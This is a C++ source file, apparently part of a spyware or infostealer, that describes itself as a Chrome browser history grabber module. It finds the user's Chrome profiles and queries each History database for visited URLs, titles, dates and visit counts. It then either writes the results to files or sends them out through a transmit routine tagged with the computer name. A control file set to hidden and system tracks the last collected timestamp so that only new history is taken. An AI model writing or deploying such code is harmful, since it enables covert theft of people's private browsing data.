/*
    Chrome browser history grabber module;
    Grabs browsing history

    Author: Kulverstukas
*/

#include <sqlite3.h>
#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <winnt.h>
#include <string>
#include <sys/stat.h>
#include <time.h>
#include <fstream>
#include "ChromeHistory.hpp"
#include "SendData.hpp"

using namespace std;

#define isBitSet(v, m) (((v) & (m)) == (m))

const string HOME_PATH = "homepath";
const string HOME_DRIVE = "homedrive";
const string XP_PATH = "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\";
const string VISTA_LATER_PATH = "\\AppData\\Local\\Google\\Chrome\\User Data\\";
const string HISTORY_FILE = "History";
const string CHROME_CONTROL_FILE = "chromecontrol.dat";
const string SQL_QUERY = "SELECT urls.url, urls.title, datetime(((visits.visit_time/1000000)-11644473600), 'unixepoch', 'localtime'), urls.visit_count, visits.visit_time FROM urls, visits WHERE (urls.id = visits.url) AND urls.url NOT LIKE \"file:///%%\" AND (visits.visit_time > %s)";
ofstream chromeDataOutF;
string chromeDataOutStr;
bool upload;
string lastChromeMillis = "";

void ChromeHistory::readFile(bool argv, char* compName) {
    upload = argv;
    string fullPath = constructFullPath();
    SendData sendData;

    vector<ChromeProfiles> profiles;
    probeFolders(fullPath, &profiles);

    string prevChromeMillis = "0";
    struct stat buff;
    for (int i = 0; i < profiles.size(); i++) {
        string controlF = profiles[i].fullPath+"\\"+CHROME_CONTROL_FILE;
        if (stat(controlF.c_str(), &buff) != -1) {
            ifstream f(controlF.c_str());
            if (f.is_open() and f.good()) {
                getline(f, prevChromeMillis);
            }
            f.close();
        }

        if (!upload) {
            chromeDataOutF.open(((string)profiles[i].profileName+".txt").c_str(), ios::app);
        }
        string chromeHistoryPath = profiles[i].fullPath+"\\"+HISTORY_FILE;
        printf("%s\n", chromeHistoryPath.c_str());
        if (stat(chromeHistoryPath.c_str(), &buff) != -1) {
            sqlite3 *dbObj;
            // this call will fail on Win7 if Chrome is opened, which means the History file is locked.
            // seems to work in WinXP though, even if chrome is opened.
            int k = sqlite3_open_v2(chromeHistoryPath.c_str(), &dbObj, SQLITE_OPEN_READONLY, NULL);
            if (k == SQLITE_OK) {
                char fQuery[280];
                sprintf(fQuery, SQL_QUERY.c_str(), prevChromeMillis.c_str());
                sqlite3_exec(dbObj, fQuery, grabChromeDataCallback, NULL, NULL);
                if (upload) {
                    sendData.transmit("Chrome", compName, profiles[i].profileName+".txt", chromeDataOutStr);
                } else {
                    chromeDataOutF.close();
                }

                // write to the control file
                if (lastChromeMillis != "") {
                    ofstream of(controlF.c_str());
                    if (of.is_open() and of.good()) {
                        of << lastChromeMillis << endl;
                        //of << 0 << endl;
                    }
                    of.close();
                    int attribs = GetFileAttributes(controlF.c_str());
                    if ((attribs != FILE_ATTRIBUTE_HIDDEN) and (attribs != FILE_ATTRIBUTE_SYSTEM)) {
                        SetFileAttributes(controlF.c_str(), FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
                    }
                }
                lastChromeMillis = "";
            }
        }
    }
}

string ChromeHistory::constructFullPath() {
    OSVERSIONINFO osvi;
    GetVersionEx(&osvi);
    string fullPath = ((string)getenv(HOME_DRIVE.c_str()))+((string)getenv(HOME_PATH.c_str()));
    if (osvi.dwMajorVersion <= 5) {
        fullPath += XP_PATH;
    } else {
        fullPath += VISTA_LATER_PATH;
    }

    return fullPath;
}

int grabChromeDataCallback(void *NotUsed, int argc, char **argv, char **azColName) {
    if (upload) {
        chromeDataOutStr.append("URL:\t"); chromeDataOutStr.append(argv[0] ? argv[0] : "EMPTY"); chromeDataOutStr.append("\n");
        chromeDataOutStr.append("Title:\t"); chromeDataOutStr.append(argv[1] ? argv[1] : "EMPTY"); chromeDataOutStr.append("\n");
        chromeDataOutStr.append("Date:\t"); chromeDataOutStr.append(argv[2] ? argv[2] : "0"); chromeDataOutStr.append("\n");
        chromeDataOutStr.append("Visits:\t"); chromeDataOutStr.append(argv[3] ? argv[3] : "EMPTY"); chromeDataOutStr.append("\n");
        chromeDataOutStr.append("\n");
    } else {
        chromeDataOutF << "URL:\t" << (argv[0] ? argv[0] : "EMPTY") << endl;
        chromeDataOutF << "Title:\t" << (argv[1] ? argv[1] : "EMPTY") << endl;
        chromeDataOutF << "Date:\t" << (argv[2] ? argv[2] : "0") << endl;
        chromeDataOutF << "Visits:\t" << (argv[3] ? argv[3] : "EMPTY") << endl;
        chromeDataOutF << endl;
    }

    lastChromeMillis = argv[4];

    return 0;
}

//string chromeTimeToPrettyDate(int64_t ntTime) {
//    time_t rawtime = ((ntTime/10000000LL)-11644473600LL);
//    struct tm *convertedTime;
//    convertedTime = localtime(&rawtime);
//    char result[22];
//    strftime(result, 22, "%Y.%m.%d, %X", convertedTime);
//    return (string)result;
//}

void ChromeHistory::probeFolders(string path, vector<ChromeProfiles>* profiles) {
    WIN32_FIND_DATA findData;
    HANDLE h = FindFirstFile((path+"*").c_str(), &findData);
    struct stat buff;
    struct ChromeProfiles sProfiles;
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (isBitSet(findData.dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY)
            and (strcmp(findData.cFileName, ".") != 0)
            and (strcmp(findData.cFileName, "..") != 0)) {
                if (stat((path+findData.cFileName+"\\"+HISTORY_FILE).c_str(), &buff) != -1) {
//                    cout << findData.cFileName << endl;
                    sProfiles.fullPath = path+findData.cFileName;
                    sProfiles.profileName = findData.cFileName;
                    profiles->push_back(sProfiles);
//                    cout << sProfiles.fullPath << endl;
                }
            }
        } while (FindNextFile(h, &findData));
    }
    FindClose(h);
}
